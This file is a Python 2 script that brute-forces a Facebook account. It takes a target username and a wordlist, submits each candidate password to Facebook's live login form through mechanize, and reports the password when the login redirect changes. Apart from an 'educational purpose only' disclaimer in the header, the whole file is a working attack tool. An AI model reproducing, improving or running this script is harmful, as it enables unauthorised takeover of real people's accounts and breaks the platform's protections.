#!usr/bin/python
# This program has been created for educational purpose only
# The user is solely responsible for illegal use of this program
# This program cracks the passwrod of the user bypassing the firewall
# Created By: Sarthak Jain
# Email : jsarthak@outlook.com

 
import sys
import random
import mechanize
import cookielib
 
email = str(raw_input("Enter the Username or Email or Phone Number : "))
passwordlist = str(raw_input("Enter the path of the password list file : "))
 
useragents = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]

def attack(password):
  login = 'https://www.facebook.com/login.php?login_attempt=1'
  invalidurl = 'https://www.facebook.com/login.php?login_attempt=1&lwv=100'
 
  try:
     sys.stdout.write("\rtrying %s.. " % password)
     sys.stdout.flush()
     br.addheaders = [('User-agent', random.choice(useragents))]
     br.open(login)
     br.select_form(nr=0)
     ##Facebook
     br.form['email'] =email
     br.form['pass'] = password
     br.submit()
     log = br.geturl()
     if (log != invalidurl):
        print "\n\n\nPassword found .. !!"
        print "\nPassword : %s\n" % (password)
        sys.exit(1)
  except KeyboardInterrupt:
        print "\nExiting program .. "
        sys.exit(1)
 
def search():
    global password
    for password in passwords:
        attack(password.replace("\n",""))
  
def check():
    global br
    global passwords
    try:
       br = mechanize.Browser()
       cj = cookielib.LWPCookieJar()
       br.set_handle_robots(False)
       br.set_handle_equiv(True)
       br.set_handle_referer(True)
       br.set_handle_redirect(True)
       br.set_cookiejar(cj)
       br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
    except KeyboardInterrupt:
       print "\nExiting program ..\n"
       sys.exit(1)
    try:
       list = open(passwordlist, "r")
       passwords = list.readlines()
       k = 0
       while k < len(passwords):
          passwords[k] = passwords[k].strip()
          k += 1
    except IOError:
        print "\nError: check your password list path \n"
        sys.exit(1)
    except KeyboardInterrupt:
        print "\nExiting program ..\n"
        sys.exit(1)
    try:
        print "Account to crack : %s" % (email)
        print "Loaded :" , len(passwords), "passwords"
    except KeyboardInterrupt:
        print "\nExiting program ..\n"
        sys.exit(1)
    try:
        search()
        attack(password)
    except KeyboardInterrupt:
        print "\nExiting program ..\n"
        sys.exit(1)
 
if __name__ == '__main__':
    check()
